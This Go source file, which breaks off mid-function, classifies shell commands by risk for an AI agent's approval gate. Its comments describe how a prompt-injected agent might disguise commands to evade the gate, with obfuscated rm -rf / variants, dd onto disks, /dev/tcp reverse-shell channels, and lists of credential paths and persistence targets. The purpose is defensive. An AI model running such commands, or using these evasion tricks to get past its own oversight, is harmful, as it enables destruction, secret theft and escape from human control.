// Package danger classifies shell commands by risk level and provides
// a configurable approval system for dangerous operations.
//
// Classification is token-based (not regex) — it respects quotes, pipes,
// redirects, compound commands (&&, ||, ;, loops, conditionals, groups), and
// multi-line input. Each command retains independent risk effects, and the
// user can configure which actions (allow/prompt/deny) apply to each class.
// Classify returns a summary; ActionForCommand combines every effect as
// deny > prompt > allow.
//
// The gate fails CLOSED. A command whose program name is recognised but
// used benignly classifies as Safe (allow); a command whose verb is NOT
// recognised classifies as Unknown and is denied by default. The set of
// recognised commands have explicit adapters for known execution and write
// forms. Unrecognized programs retain Unknown even beside ordinary redirects.
// This remains a heuristic filter; allowlisting a program does not prove that
// every option or embedded language is harmless.
//
// # Threat model
//
// The classifier is an adversarial filter, not a parser for well-behaved
// input. It assumes a prompt-injected agent is actively trying to make a
// dangerous command read as harmless so it slips past the approval gate.
// The design therefore errs toward the worse class when in doubt, and is
// built in layers that each close a category of evasion:
//
//  1. Normalisation (see normalize and normalize_phases.go) rewrites the
//     command so token-level analysis can see through shell tricks before
//     classification runs. The phases share one quote-aware lexer (shellLex),
//     so a construct is rewritten only where the shell would treat it as live:
//     - \<newline> continuations   joinLineContinuations (joined before anything else)
//     - here-document bodies       consumeHeredocs (data for cat/tee/…, else classified;
//     substitutions in an unquoted body are still classified)
//     - comments                   stripComments
//     - $'…' ANSI-C escapes        decodeANSIC   ($'\x72\x6d' → rm; \u/\U and
//     the other escapes decode, the result is emitted as a quoted literal)
//     - $IFS word-splitting        expandIFS     (rm$IFS-rf$IFS/ → rm -rf /)
//     - {a,b,c} and {1..3}/{a..c}  expandBraces  ({rm,-rf,/} → rm -rf /, /et{c,c}/x →
//     /etc/x; a group distributes its preamble and postscript; the word,
//     byte and work caps fail closed to an unknown overflow command)
//     - $(…)/`…`/<(…)/>(…) subst.  extractSubstitutions (bodies classified too,
//     nested backticks unescaped; $((…)) is arithmetic and not a command;
//     empty $N/$@ inside words vanish; a substitution glued to word
//     characters stays in its word)
//     - command/exec/builtin       stripCommandWrappers
//     - \-escapes (r\m, \rm)       collapseUnquotedBackslashes (inert escapes stay inert)
//     - absolute paths (/bin/rm)   commandName (identity preserved)
//     The tokenizer additionally treats quote boundaries as NON word
//     boundaries, so empty/adjacent quotes like r""m and "rm" still
//     resolve to the single word `rm`. An unterminated quote classifies
//     Unknown.
//
//  2. Structural decomposition. A command is split into segments (on ;,
//     &&, ||), each segment into pipe stages (on |), and EVERY stage is
//     classified — not just the head — so `true | dd of=/dev/sda` and
//     `echo x | sudo rm -rf /home` are seen for what their later stages do.
//     A stage that pipes INTO an argv composer (xargs / GNU parallel / xe)
//     running a destructive/system verb has its upstream literal payload
//     (echo/printf args) composed onto the inner command (`echo "/" | xargs
//     rm -rf` classifies like `rm -rf /`); when the payload is not statically
//     determinable the pipeline fails closed (unknown → deny). A stage that
//     pipes INTO a shell similarly composes a static payload (`echo rm -rf /
//     | sh` classifies like `rm -rf /`) so the real effect, not just
//     code_execution, wins. All independent effects survive policy evaluation;
//     rank chooses only the legacy display summary.
//     Compound commands (loops, if/case/select, time/!/coproc, groups,
//     subshells, function definitions and calls, [[ ]] and (( ))) are parsed
//     by parseShell (compound.go): the simple commands inside are classified
//     one by one, a static for list is unrolled with the loop variable bound
//     per element (a glob list per pattern, a dynamic list binds a dynamic
//     marker), branch and loop state is joined so nothing a branch may not
//     have run is trusted afterwards, and a construct that cannot be paired
//     classifies Unknown while its contents are still judged. Variable state
//     carries across `&&` chains only inside the chain.
//
//  3. Wrapper unwrapping (unwrapWrappers). Leading execution wrappers
//     (env, xargs, nohup, setsid, command, and the option-bearing wrappers
//     timeout, nice, ionice, stdbuf, chrt, taskset, flock, script, arch,
//     unbuffer, strace, watch, nix/mise/direnv/asdf exec, …) are stripped so
//     the real command underneath is classified. The option-bearing wrappers
//     share one grammar (wrapper_grammar.go: value-taking short, long and
//     abbreviated options, fixed operands, command-string options such as
//     `script -c`, `flock -c`, `env -S`), so an option value is never read as
//     the wrapped command. Privileged wrappers (sudo, doas, pkexec)
//     additionally impose a system_write floor and then let the inner command
//     escalate further (sudo rm -rf /var → destructive).
//
//  4. Verb-independent resource scanning (classifyResourceToken). Some
//     resources are dangerous regardless of the command touching them:
//     /dev/tcp and /dev/udp pseudo-devices (reverse-shell channels),
//     sensitive credential paths (~/.ssh, /etc/shadow, ~/.aws/credentials,
//     /proc/self/environ, …), secret-shaped environment variables and
//     credential files by basename, extension or directory (secret_reads.go).
//     These are flagged wherever they appear.
//
//  5. Payload re-classification. Shell -c strings (bash -c '…') and the
//     bodies of command/process substitutions are themselves classified by
//     re-entering Classify, so nested commands cannot hide a level deeper.
//
//  6. Tool adapters. Tools whose danger depends on verb and options have
//     adapters in command_effects.go and its neighbours: gh by command and
//     verb (gh_adapter.go), network uploads, listeners and tunnels split from
//     plain egress as NetworkUpload (network_upload.go), exec-capable options
//     of tar/sed/ssh/rsync/git/kubectl/…, and a repository-aware rule for
//     git (git_repo_arming.go): ordinary verbs such as status, commit or
//     merge escalate to code_execution only when the repository they target
//     is armed (an executable hook, core.hooksPath, an fsmonitor command, a
//     filter or driver, an editor), and an undeterminable repository counts
//     as armed.
//
//  7. Unread-script gate (readledger.go, ledger_indirect.go). Executing a
//     script the session never read is gated, including scripts delivered
//     through pipes, substitutions, eval, find -exec and program-file
//     options. The ledger is fingerprinted and bounded.
//
// The denylist is applied in ActionForCommand before class-based actions. An
// entry is a token prefix matched at every command position the shell would
// run (denylist.go), not a raw string prefix of the whole line.
//
// Analysis is bounded: input longer than MaxCommandBytes classifies Unknown
// and is denied before any phase runs, one Analyze call examines at most a
// fixed number of tokens across nested payloads, and here-document, brace and
// substitution scanning carry their own budgets; an exceeded budget fails
// closed as Unknown.
//
// # Limitations
//
// This is a heuristic defence-in-depth layer, NOT a sandbox or a complete
// shell interpreter. It does not, and cannot, catch everything:
//
//   - Shell state beyond static assignments and known cwd changes. Runtime
//     variable transformations and ambiguous conditional/background writes
//     fail closed as Unknown when their destination cannot be determined.
//     Values that exist only at run time (command output, a dynamic for list)
//     are opaque; the denylist does not resolve them.
//   - Fully dynamic construction from runtime data, command output, or
//     environment the classifier cannot evaluate.
//   - Repository state is read when the command is classified. A hook or
//     config written by another process between classification and execution
//     is not seen; one written earlier in the same command is.
//   - Arbitrary value transformations beyond the enumerated encodings
//     (e.g. a secret piped through gzip/openssl before exfiltration).
//   - Interpreter escape hatches we do not special-case. Common ones ARE
//     covered: awk/ed/vi/emacs invocations that carry a script or file operand
//     classify as code_execution (embeddedShellInterpreters), as do non-shell
//     interpreters fed from a pipe (`curl … | python`). Language-specific eval
//     paths or editor command-mode shells we have not enumerated may still read
//     as a known command used benignly — the known verb is the gap, not an
//     unknown one.
//
// Because these gaps exist, the classifier is paired with other controls:
// non-interactive denial, output redaction (internal/redact), and — for
// strong isolation — the container sandbox. When tuning, remember that
// over-classification only costs an extra prompt, while under-classification
// can let a destructive or exfiltrating command through silently; prefer the
// former.
package danger

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"unicode"
	"unicode/utf8"
)

// ── Types ──────────────────────────────────────────────────────────────

// RiskClass represents the risk level of a shell command.
type RiskClass string

const (
	Safe          RiskClass = "safe"
	LocalWrite    RiskClass = "local_write"
	SystemWrite   RiskClass = "system_write"
	Persistence   RiskClass = "persistence"
	Destructive   RiskClass = "destructive"
	NetworkEgress RiskClass = "network_egress"
	NetworkUpload RiskClass = "network_upload"
	CodeExecution RiskClass = "code_execution"
	Install       RiskClass = "install"
	Blocked       RiskClass = "blocked"

	// Unknown is the fall-through class for a command whose program name the
	// classifier does not recognise. It defaults to Deny (same as
	// Destructive): the gate fails CLOSED rather than open, so a novel or
	// obfuscated verb that dodged every known-dangerous check cannot run
	// unprompted. Recognised-but-benign usage classifies as Safe instead.
	Unknown RiskClass = "unknown"
)

// Persistence: writes aimed at targets whose entire purpose is
// deferred execution — shell profiles, direnv files, git hooks, CI
// workflow files, cron/systemd/launchd definitions, and package-manager
// lifecycle scripts. The write is neither destructive, nor egress, nor an
// in-session install, which is exactly why nothing used to escalate: the
// payload fires later, in a context the user trusts (every future shell,
// the next push, the next test run). Keyed on write targets, not command
// shape, and gated even when the repo documents the write.
//
// NetworkUpload: network operations that send local content out or let a
// remote party in — request bodies read from a file, stdin or a runtime
// substitution, credentials or client certificates, mutating methods,
// local-source/remote-destination transfers, and opened listeners or tunnels
// (see network_upload.go for the exact rule and the line drawn against plain
// egress). It ranks between NetworkEgress and CodeExecution, defaults to
// Prompt, and always travels with a NetworkEgress effect so the two classes
// are evaluated independently.

// Action represents what to do when a command of a given risk class is detected.
type Action string

const (
	Allow  Action = "allow"
	Prompt Action = "prompt"
	Deny   Action = "deny"
	// ReadOnly is not a per-class action — it is a non_interactive mode
	// without a TTY, read-only inspection proceeds while writes,
	// execution, and egress stay denied. Containment via inability is not
	// safe-and-useful; read_only keeps headless agents useful enough that
	// nobody reaches for "allow".
	ReadOnly Action = "read_only"
)

// ── Tool Operation ─────────────────────────────────────────────────────

// ToolOperation describes a native tool call for approval checking.
type ToolOperation struct {
	Name     string
	Resource string
	Risk     RiskClass
}

// ── Path-based classification ──────────────────────────────────────────

// ClassifyPath returns a RiskClass for a filesystem path.
//
// Classification rules (highest wins):
//   - /boot, /dev, /proc, /sys, /mnt, /media → destructive
//   - / (the filesystem root itself) → system_write
//   - the current user's own home (even when it is /root or sits under a
//     system prefix) follows the $HOME rules below; everything else under it
//     → local_write, ahead of the system-prefix rule
//   - /tmp, $TMPDIR → local_write
//   - /etc, /root, /var, /run, /lib, /usr, /bin, /sbin, /opt, /srv → system_write
//   - $HOME/.ssh, .config, .gnupg, .aws, .kube, .docker, .gitconfig, .env → system_write
//   - $HOME/.odek/config.json, secrets.env, IDENTITY.md, skills/, sessions/, audit/,
//     plans/, schedules.json, schedule-state.json, mcp_approvals.json,
//     mcp_tool_approvals.json, restart.json, telegram.lock, etc. → system_write
//     (odek trust anchors; rewriting them can disable the sandbox, persist attacker
//     control, or leak secrets)
//   - $HOME shell rc/profile files (.bashrc, .zshrc, .profile, .zshenv, etc.) → system_write
//   - everything else → local_write
//
// macOS: /private/{etc,var,tmp} are transparently normalised before matching.
func ClassifyPath(path string) RiskClass {
	path = expandShellTokenPath(path)
	lexical := classifyPathLexical(path)
	// Character pseudo-devices (stdio aliases, discards) stay LocalWrite no
	// matter where they resolve: on Linux /dev/stdout is a symlink through
	// /proc/self/fd to a /dev/pts entry, and both resolved prefixes would
	// otherwise escalate a benign discard to Destructive.
	if isDirectBenignDevice(path) {
		return LocalWrite
	}
	resolved, err := resolvePathTarget(path)
	if err != nil {
		return worstOf(lexical, SystemWrite)
	}
	return worstOf(lexical, classifyPathLexical(resolved))
}

func classifyPathLexical(path string) RiskClass {
	abs, err := absPath(path)
	if err != nil {
		return SystemWrite
	}
	abs = filepath.Clean(abs)

	// macOS canonicalizes /etc, /var, and /tmp as symlinks under /private.
	// Strip the /private prefix so the sensitivity checks below match
	// consistently — e.g. /private/etc/master.passwd must classify the same
	// as /etc/master.passwd (system_write), and /private/var/folders/... must
	// still resolve to the temp dir (local_write).
	if strings.HasPrefix(abs, "/private/") {
		abs = strings.TrimPrefix(abs, "/private")
	}

	// The filesystem root itself. A mutation aimed at / (chmod -R 777 /,
	// mv / /tmp/x, dd of=/, …) is system-wide damage and must never fall
	// through to local_write just because "/" carries no directory prefix.
	if abs == string(filepath.Separator) {
		return SystemWrite
	}

	// Character pseudo-devices used as discards or stdio aliases are not
	// raw disks. Classifying every /dev path as Destructive made
	// `echo x > /dev/null` and `dd of=/dev/stdout` prompt as system_write.
	if isBenignCharDevice(abs) {
		return LocalWrite
	}

	for _, prefix := range []string{"/boot", "/dev", "/proc", "/sys", "/mnt", "/media"} {
		if abs == prefix || strings.HasPrefix(abs, prefix+"/") {
			return Destructive
		}
	}

	for _, home := range accountHomes(abs) {
		if cls, ok := classifyHomeRelative(home, abs); ok {
			return cls
		}
	}

	// The current user's own home takes precedence over the system-path
	// prefixes below. An agent running as root has HOME=/root, which is a
	// system path for every other account; without this every ordinary
	// write to its own home would prompt. The protected home paths (rc files,
	// credential directories, odek anchors) were already decided above.
	for _, home := range currentHomeDirs() {
		if pathWithin(abs, home) {
			return LocalWrite
		}
	}

	// Ordinary temp paths are local after home-sensitive checks. This handles
	// macOS where temp dirs live under /var/folders/, preventing false
	// SystemWrite classification (matching Linux /tmp behavior).
	// os.TempDir may include a trailing separator on some platforms;
	// Clean normalises it before the prefix check.
	if tmpDir := filepath.Clean(os.TempDir()); abs == tmpDir || strings.HasPrefix(abs, tmpDir+string(filepath.Separator)) {
		return LocalWrite
	}

	for _, prefix := range []string{"/etc", "/root", "/var", "/run", "/lib", "/lib32", "/lib64", "/libx32", "/usr", "/bin", "/sbin", "/opt", "/srv"} {
		if abs == prefix || strings.HasPrefix(abs, prefix+"/") {
			return SystemWrite
		}
	}

	return LocalWrite
}

// degenerateHomes are directories that cannot serve as a user's home for
// precedence purposes: treating the filesystem root or a bare system
// directory as "home" would turn the whole system tree into local writes.
var degenerateHomes = map[string]bool{
	"/": true, "/etc": true, "/var": true, "/run": true, "/lib": true, "/lib64": true,
	"/usr": true, "/bin": true, "/sbin": true, "/opt": true, "/srv": true,
	"/boot": true, "/dev": true, "/proc": true, "/sys": true, "/mnt": true, "/media": true,
}

// currentHomeDir returns the cleaned absolute home directory of the current
// user, or "" when it is unknown or degenerate.
func currentHomeDir() string {
	home, _ := os.UserHomeDir()
	if home == "" || !filepath.IsAbs(home) {
		return ""
	}
	home = filepath.Clean(home)
	if strings.HasPrefix(home, "/private/") {
		home = strings.TrimPrefix(home, "/private")
	}
	if degenerateHomes[home] {
		return ""
	}
	return home
}

// currentHomeDirs returns the current user's home as spelled in $HOME and, when
// the home is reached through a symlink (macOS keeps /home under /System, a
// server may link /home/user into a data volume), the physical directory that
// symlink-resolved targets sit under. Both spellings name the same home.
func currentHomeDirs() []string {
	home := currentHomeDir()
	if home == "" {
		return nil
	}
	homes := []string{home}
	if resolved, err := resolvePathTarget(home); err == nil {
		resolved = strings.TrimPrefix(filepath.Clean(resolved), "/private")
		if resolved != home && !degenerateHomes[resolved] && filepath.IsAbs(resolved) {
			homes = append(homes, resolved)
		}
	}
	return homes
}

// pathWithin reports whether abs is dir itself or lies under it.
func pathWithin(abs, dir string) bool {
	return abs == dir || strings.HasPrefix(abs, dir+string(filepath.Separator))
}

// accountHomes returns the home directories whose protected-path rules apply
// to abs: the current user's home plus the account home (/home/<name>,
// /Users/<name>, /root) abs sits under. Agents commonly run as root, where
// another account's shell rc files and credential directories are as live a
// target as the caller's own.
func accountHomes(abs string) []string {
	var homes []string
	if home, _ := os.UserHomeDir(); home != "" {
		homes = append(homes, home)
	}
	if physical := currentHomeDirs(); len(physical) > 1 {
		homes = append(homes, physical[1:]...)
	}
	lower := strings.ToLower(abs)
	for _, base := range []string{"/home/", "/users/"} {
		if !strings.HasPrefix(lower, base) {
			continue
		}
		rest := abs[len(base):]
		name, _, _ := strings.Cut(rest, "/")
		if name == "" {
			continue
		}
		homes = append(homes, abs[:len(base)]+name)
	}
	if lower == "/root" || strings.HasPrefix(lower, "/root/") {
		homes = append(homes, abs[:len("/root")])
	}
	return homes
}

// classifyHomeRelative applies the home-directory rules to abs for one
// account home. The boolean is false when abs is not protected by them.
func classifyHomeRelative(home, abs string) (RiskClass, bool) {
	// Case-fold the home-relative prefix comparisons: the filesystem may
	// be case-insensitive (macOS APFS default, Windows NTFS), where
	// /Users/x/.SSH and /Users/x/.ssh are the same directory and an
	// exact-case match would let a case variant slip past the guard.
	lowerAbs, lowerHome := strings.ToLower(abs), strings.ToLower(home)
	for _, sub := range []string{"/.ssh", "/.config", "/.gnupg", "/.aws", "/.kube",
		"/.docker", "/.gitconfig", "/.env",
		"/.netrc", "/.npmrc", "/.pypirc", "/.pgpass",
		"/.git-credentials", "/.my.cnf", "/.mylogin.cnf",
		"/.cargo", "/.gem", "/.azure", "/.password-store",
		"/.terraform.d", "/.vault-token"} {
		if strings.HasPrefix(lowerAbs, lowerHome+sub) {
			return SystemWrite, true
		}
	}
	// odek's own trust anchors. Rewriting ~/.odek/config.json can disable
	// the sandbox or set "action": "allow" (YOLO) for the next run; a
	// SKILL.md dropped under ~/.odek/skills/ is auto-loaded into future
	// prompts; secrets.env is injected into the process environment;
	// IDENTITY.md becomes the system prompt on the next run, so writing it
	// lets a prompt-injected agent rewrite its own trusted instructions.
	// sessions/, audit/, plans/, schedules.json, schedule-state.json and
	// other state files similarly grant persistence or leak secrets.
	// Auto-allowing these as LocalWrite would let a confined agent
	// escalate out of its own sandbox, so they classify as SystemWrite
	// (prompt/deny). Keep in sync with the carve-out exclusions in
	// cmd/odek/file_tool.go (isProtectedOdekPath).
	if isOdekTrustAnchor(home, abs) {
		return SystemWrite, true
	}
	// Shell rc/profile files execute on the user's next shell start —
	// writing them is persistence/escalation, not a local file edit.
	// Case-folding defends against case-insensitive filesystems (macOS APFS).
	if filepath.Dir(abs) == home && shellRCFilesLower[strings.ToLower(filepath.Base(abs))] {
		return SystemWrite, true
	}
	return LocalWrite, false
}

// isBenignCharDevice reports whether abs is a character pseudo-device used
// as a discard or stdio alias, not a raw block device. Writes here are
// local_write (or fall through to Safe for display/dd idioms), never
// Destructive via the /dev prefix.
func isBenignCharDevice(abs string) bool {
	switch abs {
	case "/dev/null", "/dev/zero", "/dev/full",
		"/dev/stdout", "/dev/stderr", "/dev/stdin",
		"/dev/tty":
		return true
	}
	return strings.HasPrefix(abs, "/dev/fd/")
}

// isDirectBenignDevice excludes unresolved .. components: cleaning those
// before following a symlink can turn a protected target into a stdio alias.
func isDirectBenignDevice(path string) bool {
	return filepath.IsAbs(path) && filepath.Clean(path) == path && isBenignCharDevice(path)
}

// shellRCFiles are dotfiles in $HOME that shells execute automatically on
// startup/login. Writing any of them is code execution on the next shell,
// so ClassifyPath escalates them to SystemWrite. Fish/nushell configs live
// under ~/.config, which is already covered by the home-sensitive-dir list.
var shellRCFiles = map[string]bool{
	".bashrc": true, ".bash_profile": true, ".bash_login": true,
	".bash_logout": true, ".bash_aliases": true, ".profile": true,
	".zshrc": true, ".zprofile": true, ".zshenv": true, ".zlogin": true,
	".zlogout": true, ".kshrc": true, ".cshrc": true, ".tcshrc": true,
	".login": true, ".logout": true,
	// X session / mksh startup scripts run automatically at login or shell
	// start just like the shells' own rc files.
	".xinitrc": true, ".xprofile": true, ".xsession": true, ".xsessionrc": true,
	".mkshrc": true, ".pdkshrc": true,
}

// ClassifyPath uses shellRCFiles with case-folding because macOS APFS is
// case-insensitive by default: ~/.odek/BASHRC and ~/.bashrc refer to the
// same file.
var shellRCFilesLower = func() map[string]bool {
	m := make(map[string]bool, len(shellRCFiles))
	for k := range shellRCFiles {
		m[strings.ToLower(k)] = true
	}
	return m
}()

// ── Persistence targets ───────────────────────────────────────────
//
// Targets whose entire purpose is deferred execution: the write itself is
// quiet, the payload runs later in a context the user trusts (next shell,
// next cd, next commit/push, next boot, next CI run with CI credentials,
// next install / test run).

// persistenceDirMarkers are lowercased path substrings that mark a
// deferred-execution directory or file. Substring matching (with the
// leading slash) keeps relative paths like .github/workflows/x.yml working
// after filepath.Abs without reimplementing git/CI layout resolution.
var persistenceDirMarkers = []string{
	"/.git/hooks/",        // runs on commit, push, checkout
	"/.github/workflows/", // runs on the next push, with CI credentials
	"/.gitea/workflows/",  // Gitea / Forgejo Actions: same trigger model
	"/.forgejo/workflows/",
	"/.circleci/",          // CircleCI pipeline definitions
	"/.buildkite/",         // Buildkite pipeline definitions
	"/.woodpecker/",        // Woodpecker CI pipeline definitions
	"/etc/cron.d/",         // runs on a schedule
	"/etc/crontab",         // runs on a schedule
	"/etc/cron.daily/",     // runs daily (Debian run-parts)
	"/etc/cron.hourly/",    // runs hourly
	"/etc/cron.weekly/",    // runs weekly
	"/etc/cron.monthly/",   // runs monthly
	"/var/spool/cron/",     // per-user crontabs (Linux)
	"/usr/lib/cron/tabs/",  // per-user crontabs (macOS)
	"/etc/systemd/",        // system units — boot / timer triggered
	"/lib/systemd/system/", // distro unit dir (symlinked /sbin/init → /lib/systemd/systemd must NOT match)
	"/etc/profile.d/",      // sourced by login shells
	// macOS launchd — case-insensitive match covers /Library and
	// ~/Library forms alike once ~ is expanded.
	"/library/launchdaemons",
	"/library/launchagents",
}

// persistenceBaseNames are exact (lowercased) file names that defer
// execution wherever they appear in a tree.
var persistenceBaseNames = map[string]bool{
	".envrc":                  true, // direnv: executes on cd
	".gitlab-ci.yml":          true, // runs on the next push, with CI credentials
	".travis.yml":             true,
	".drone.yml":              true,
	".cirrus.yml":             true,
	"azure-pipelines.yml":     true,
	"azure-pipelines.yaml":    true,
	"bitbucket-pipelines.yml": true,
	"appveyor.yml":            true,
	".appveyor.yml":           true,
	".woodpecker.yml":         true,
	"jenkinsfile":             true,
	"config.fish":             true, // fish shell config (also under ~/.config)
	"crontab":                 true,
}

// IsPersistencePath reports whether path names a deferred-execution target.
// It is direction-agnostic; callers gating reads should keep using
// ClassifyPath (reads of these files stay at their existing class) and
// reserve the persistence escalation for writes via ClassifyPathWrite.
func IsPersistencePath(path string) bool {
	path = expandShellTokenPath(path)
	if isPersistencePathLexical(path) {
		return true
	}
	resolved, err := resolvePathTarget(path)
	return err == nil && isPersistencePathLexical(resolved)
}

func isPersistencePathLexical(path string) bool {
	// Expand ~ / $HOME shorthands so direct API callers (file tools, tests)
	// behave identically to shell-token classification.
	path = expandShellTokenPath(path)
	if path == "" {
		return false
	}
	abs, err := absPath(path)
	if err != nil {
		return false
	}
	abs = filepath.Clean(abs)
	// Normalise macOS /private/* the same way ClassifyPath does.
	if strings.HasPrefix(abs, "/private/") {
		abs = strings.TrimPrefix(abs, "/private")
	}
	lower := strings.ToLower(abs)
	// A directory destination reaches its marker only with the trailing
	// slash that Clean removed: writing INTO .git/hooks lands a hook.
	dirLower := lower + "/"

	for _, home := range accountHomes(abs) {
		lowerHome := strings.ToLower(home)
		// Shell rc/profile files: run in every future shell.
		if filepath.Dir(lower) == lowerHome && shellRCFilesLower[filepath.Base(lower)] {
			return true
		}
		// User systemd units: run at login / on timer.
		for _, unitDir := range []string{"/.config/systemd/user/", "/.local/share/systemd/user/"} {
			if strings.HasPrefix(dirLower, lowerHome+unitDir) {
				return true
			}
		}
	}
	for _, marker := range persistenceDirMarkers {
		if strings.Contains(dirLower, marker) {
			return true
		}
	}
	if isGitExecConfig(dirLower) {
		return true
	}
	return persistenceBaseNames[filepath.Base(lower)]
}

// isGitExecConfig reports whether dirLower (a lowercased absolute path with a
// trailing slash) names repository configuration git executes commands from
// (core.fsmonitor, core.hooksPath, alias.*=!cmd, credential.helper, ...) or a
// submodule's hook directory.
func isGitExecConfig(dirLower string) bool {
	trimmed := strings.TrimSuffix(dirLower, "/")
	if strings.HasSuffix(trimmed, "/.git/config") || strings.HasSuffix(trimmed, "/.git/config.worktree") {
		return true
	}
	if _, rest, ok := strings.Cut(dirLower, "/.git/modules/"); ok {
		if strings.Contains(rest, "/hooks/") || strings.HasSuffix(strings.TrimSuffix(rest, "/"), "/config") ||
			strings.HasSuffix(strings.TrimSuffix(rest, "/"), "/config.worktree") {
			return true
		}
	}
	if _, rest, ok := strings.Cut(dirLower, "/.git/worktrees/"); ok {
		if strings.Contains(rest, "/hooks/") || strings.HasSuffix(strings.TrimSuffix(rest, "/"), "/config.worktree") {
			return true
		}
	}
	return false
}

// ClassifyPathWrite classifies a filesystem WRITE target. It wraps
// ClassifyPath and additionally escalates deferred-execution targets to
// Persistence (rank above SystemWrite, default action Prompt, never
// eligible for session trust shortcuts). Reads keep using ClassifyPath —
// reading a CI workflow file must stay as frictionless as before.
func ClassifyPathWrite(path string) RiskClass {
	cls := ClassifyPath(path)
	if cls == Blocked || cls == Destructive {
		return cls // already worse than persistence
	}
	if IsPersistencePath(path) && Rank(Persistence) > Rank(cls) {
		return Persistence
	}
	return cls
}

// lifecycleHookPatterns match deferred-execution hooks embedded in files
// that are not themselves persistence targets: package-manager install
// lifecycle scripts and pytest autouse fixtures. Their whole purpose is to
// run at install time / on every test run — the write that plants them is
// persistence even though package.json/conftest.py are ordinary repo files.
var lifecycleHookPatterns = []*regexp.Regexp{
	regexp.MustCompile(`"(preinstall|postinstall|prepare|prepublish|prepublishOnly|prepack|postpack)"\s*:`),
	regexp.MustCompile(`autouse\s*=\s*True`),
}

// LifecycleContentClass inspects content written to path for lifecycle
// hooks. It returns (Persistence, true) when the content plants
// deferred execution into package.json / conftest.py, else (base, false).
// Only ever escalates — base is returned unchanged otherwise.
func LifecycleContentClass(path, content string, base RiskClass) (RiskClass, bool) {
	switch strings.ToLower(filepath.Base(path)) {
	case "package.json", "conftest.py":
	default:
		return base, false
	}
	if Rank(base) >= Rank(Persistence) {
		return base, false // already gated at least as strongly
	}
	for _, re := range lifecycleHookPatterns {
		if re.MatchString(content) {
			return Persistence, true
		}
	}
	return base, false
}

// isOdekTrustAnchor reports whether abs is a file or directory under ~/.odek
// that must not be writable through auto-approved local_write tools. It must
// stay in sync with cmd/odek/file_tool.go::isProtectedOdekPath.
func isOdekTrustAnchor(home, abs string) bool {
	if home == "" {
		return false
	}
	prefix := home + "/.odek"
	// Case-folded comparison — ~/.ODEK and ~/.odek are the same directory
	// on case-insensitive filesystems (macOS APFS default, Windows).
	lowerAbs, lowerPrefix := strings.ToLower(abs), strings.ToLower(prefix)
	if lowerAbs != lowerPrefix && !strings.HasPrefix(lowerAbs, lowerPrefix+"/") {
		return false
	}
	// The ~/.odek directory itself is an anchor.
	if lowerAbs == lowerPrefix {
		return true
	}
	rel := strings.ToLower(filepath.Clean(lowerAbs[len(lowerPrefix+"/"):]))

	protectedExact := []string{
		"config.json",
		"secrets.env",
		"identity.md",
		"schedules.json",
		"schedule-state.json",
		"schedules.lock",
		"mcp_approvals.json",
		"mcp_tool_approvals.json",
		"project_sandbox_approvals.json",
		"restart.json",
		"telegram.lock",
		"telegram.pid",
		"schedule.pid",
		"schedule.log",
		"runtime.log",
	}
	for _, p := range protectedExact {
		if rel == p {
			return true
		}
	}
	protectedDirs := []string{
		"skills",
		"sessions",
		"audit",
		"plans",
		"memory",
	}
	for _, d := range protectedDirs {
		if rel == d || strings.HasPrefix(rel, d+string(filepath.Separator)) {
			return true
		}
	}
	return false
}

// ClassifyURL returns a RiskClass for a browser URL.
// Internal IPs → system_write; external → network_egress.
// Uses proper IP parsing (handles decimal, octal, hex, IPv6 compressed,
// short forms like 127.1, and all other representations that browsers
// accept via inet_aton-style parsing) instead of string prefix matching
// which was trivially bypassable.
func ClassifyURL(rawURL string) RiskClass {
	u, err := url.Parse(rawURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return NetworkEgress // can't parse — don't block, but will fail at fetch time
	}

	// A trailing-dot FQDN ("169.254.169.254.") resolves to the same host
	// but would otherwise dodge both the IP and hostname checks.
	host := strings.TrimSuffix(u.Hostname(), ".")

	// Try as an IP address — uses browser-compatible parsing that handles
	// decimal (127.0.0.1), octal (0177.0.0.1), hex (0x7f000001),
	// mixed (127.0x1), short (127.1), single-integer (2130706433),
	// IPv6 compressed ([::1]), IPv4-mapped IPv6, etc.
	if ip := parseBrowserIP(host); ip != nil {
		if IsBlockedIP(ip) {
			return SystemWrite
		}
		return NetworkEgress
	}

	// Hostname-based: well-known private names and private suffixes.
	if hostnameIsInternal(host) {
		return SystemWrite
	}

	return NetworkEgress
}

// extraBlockedNets contains IPv4 ranges that net.IP.IsPrivate does not cover
// but which must still be unreachable to the agent's web tools:
//   - 100.64.0.0/10  RFC 6598 CGNAT (includes Tailscale)
//   - 198.18.0.0/15  RFC 2544 benchmark testing
var extraBlockedNets []*net.IPNet

func init() {
	for _, cidr := range []string{"100.64.0.0/10", "198.18.0.0/15"} {
		_, n, err := net.ParseCIDR(cidr)
		if err != nil {
			panic(fmt.Sprintf("danger: invalid blocked CIDR %q: %v", cidr, err))
		}
		extraBlockedNets = append(extraBlockedNets, n)
	}
}

// IsBlockedIP reports whether ip falls in a range that the agent's web tools
// must never reach: loopback (127/8, ::1), RFC1918 / RFC4193 private (incl.
// IPv6 ULA fc00::/7), link-local (169.254/16 — which covers the
// 169.254.169.254 cloud-metadata endpoint — and fe80::/10), RFC 6598 CGNAT
// (100.64/10), RFC 2544 benchmark testing (198.18/15), "this network"
// (0.0.0.0/8), the unspecified address (::), or an IPv6 form that embeds a
// blocked IPv4 address (NAT64 64:ff9b::/96, 6to4 2002::/16, local-use NAT64
// 64:ff9b:1::/48). It is the single source of truth shared by both
// ClassifyURL's literal-host gate and the dial-time SSRF guard, so the two
// cannot drift apart. A nil IP is treated as blocked (fail closed).
func IsBlockedIP(ip net.IP) bool {
	if ip == nil {
		return true
	}
	if ip.IsLoopback() || ip.IsPrivate() ||
		ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
		ip.IsUnspecified() {
		return true
	}
	for _, n := range extraBlockedNets {
		if n.Contains(ip) {
			return true
		}
	}
	if v4 := ip.To4(); v4 != nil {
		// 0.0.0.0/8 ("this network"): Linux routes 0.x.y.z to the local host.
		return v4[0] == 0
	}
	if len(ip) == net.IPv6len {
		switch {
		case ip[0] == 0x00 && ip[1] == 0x64 && ip[2] == 0xff && ip[3] == 0x9b &&
			ipBytesAllZero(ip[4:12]):
			// NAT64 well-known prefix 64:ff9b::/96: the low 32 bits are an
			// IPv4 address the gateway connects to, so the embedded address
			// decides.
			return IsBlockedIP(net.IP(append([]byte(nil), ip[12:16]...)))
